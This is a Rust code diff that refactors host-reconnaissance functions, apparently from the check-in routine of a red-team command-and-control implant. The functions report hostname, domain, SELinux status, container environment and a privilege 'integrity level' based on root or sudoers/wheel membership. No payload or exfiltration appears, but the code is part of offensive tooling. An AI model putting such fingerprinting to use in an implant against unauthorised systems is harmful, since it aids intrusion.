@@ -1,20 +1,21 @@
-use std::{
-    ffi::CString,
-    io::{BufRead, BufReader},
-};
+use std::io::{BufRead, BufReader};
 
 use errors::ThanatosError;
-use ffiwrappers::{
-    errors::FfiError,
-    linux::{
-        addrinfo::{AddrInfoList, AiFlags, Hints},
-        socket::SockType,
-        uname::{self, UtsName},
-        user::UserInfo,
-    },
+use ffiwrappers::linux::{
+    uname::{self, UtsName},
+    user::UserInfo,
 };
 
 use crate::proto::checkin::{Architecture, ContainerEnv};
+
+mod dnsname;
+pub use dnsname::{domain, hostname};
+
+mod integrity;
+pub use integrity::integrity_level;
+
+mod selinux;
+pub use selinux::selinux_enabled;
 
 pub fn container_environment() -> ContainerEnv {
     if let Ok(readdir) = std::fs::read_dir("/") {
@@ -34,20 +35,6 @@ pub fn container_environment() -> ContainerEnv {
     }
 
     ContainerEnv::None
-}
-
-// TODO: Return this into a separate initial check in field.
-// Parse /proc/self/mountinfo for selinux detection instead of looking for /sys/fs/selinux
-pub fn selinux_enabled() -> bool {
-    if let Ok(readdir) = std::fs::read_dir("/sys/fs") {
-        for entry in readdir.flatten() {
-            if entry.file_name() == "selinux" {
-                return true;
-            }
-        }
-    }
-
-    false
 }
 
 pub fn kernel() -> Option<String> {
@@ -96,39 +83,10 @@ pub fn distro() -> Option<String> {
     }
 }
 
-pub fn hostname() -> Result<String, ThanatosError> {
-    let h = ffiwrappers::linux::gethostname().map_err(ThanatosError::FFIError)?;
-    Ok(h.split('.').next().unwrap_or(&h).to_string())
-}
-
 pub fn username() -> Result<String, ThanatosError> {
     UserInfo::current_user()
         .map(|userinfo| userinfo.username().to_string())
         .map_err(ThanatosError::FFIError)
-}
-
-pub fn domain() -> Result<String, ThanatosError> {
-    let current_host = ffiwrappers::linux::gethostname().map_err(ThanatosError::FFIError)?;
-    let current_host =
-        CString::new(current_host).map_err(|_| ThanatosError::FFIError(FfiError::InteriorNull))?;
-
-    let addrlist = AddrInfoList::new(
-        Some(&current_host),
-        None,
-        Some(Hints {
-            socktype: SockType::SockDgram,
-            flags: AiFlags::CANONNAME,
-            family: Default::default(),
-        }),
-    )
-    .map_err(ThanatosError::FFIError)?;
-
-    let canonname = addrlist.first().canonname().to_string();
-
-    let mut s = canonname.split('.');
-    s.next()
-        .ok_or(ThanatosError::FFIError(FfiError::CanonNameNotFound))?;
-    Ok(s.collect::<Vec<&str>>().join("."))
 }
 
 pub fn architecture() -> Option<Architecture> {
@@ -139,92 +97,6 @@ pub fn architecture() -> Option<Architecture> {
     }
 }
 
-pub fn integrity_level() -> Result<u32, ThanatosError> {
-    let effective_user = UserInfo::effective_user().map_err(ThanatosError::FFIError)?;
-    if effective_user.uid() == 0 {
-        return Ok(4);
-    }
-
-    let current_groups = UserInfo::current_user()
-        .map_err(ThanatosError::FFIError)?
-        .group_membership()
-        .map_err(ThanatosError::FFIError)?;
-
-    for group in current_groups.members {
-        if group.gid() == 0 {
-            return Ok(3);
-        }
-
-        if group.groupname() == "sudoers" {
-            return Ok(3);
-        }
-
-        if group.groupname() == "wheel" {
-            return Ok(3);
-        }
-    }
-
-    Ok(2)
-}
-
 pub fn process_name() -> Result<String, ThanatosError> {
     std::fs::read_to_string("/proc/self/comm").map_err(ThanatosError::IoError)
-}
-
-#[cfg(test)]
-mod tests {
-    use std::ffi::CString;
-
-    use ffiwrappers::linux::{
-        addrinfo::{AddrInfoList, AiFlags, Hints},
-        socket::SockType,
-    };
-
-    #[test]
-    fn hostname_test() {
-        let hostname = super::hostname().unwrap();
-        assert!(!hostname.starts_with('.'));
-        assert!(!hostname.ends_with('.'));
-    }
-
-    #[test]
-    fn domain_test() {
-        let domain = super::domain().unwrap();
-        assert!(!domain.starts_with('.'));
-        assert!(!domain.ends_with('.'));
-    }
-
-    #[test]
-    fn fqdn_canonname_test() {
-        let host = super::hostname().unwrap();
-        let domain = super::domain().unwrap();
-
-        let mut fqdn = format!("{}.{}", host, domain);
-
-        if !fqdn.ends_with('.') {
-            fqdn.push('.');
-        }
-
-        let current_host = ffiwrappers::linux::gethostname().unwrap();
-        let current_host = CString::new(current_host).unwrap();
-
-        let addrlist = AddrInfoList::new(
-            Some(&current_host),
-            None,
-            Some(Hints {
-                socktype: SockType::SockDgram,
-                flags: AiFlags::CANONNAME,
-                family: Default::default(),
-            }),
-        )
-        .unwrap();
-
-        let mut canonname = addrlist.first().canonname().to_string();
-
-        if !canonname.ends_with('.') {
-            canonname.push('.');
-        }
-
-        assert_eq!(canonname, fqdn);
-    }
 }
